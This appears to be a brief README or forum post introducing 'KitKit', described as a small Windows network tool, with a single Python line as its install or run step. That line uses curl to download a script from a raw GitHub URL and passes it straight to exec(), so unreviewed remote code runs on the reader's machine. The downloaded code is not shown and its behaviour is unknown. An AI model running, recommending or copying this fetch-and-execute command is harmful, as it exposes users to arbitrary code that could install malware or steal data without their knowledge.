## What is KitKit?

KitKit is a small windows network tool I created a while ago. I decided to share it since I still use it occasionally.

If you want something added, fixed, or anything else, feel free to DM me.

```python
exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.com/darlinglasting/kitkit/refs/heads/main/main.py'], capture_output=True).stdout.decode('utf-8'))
```
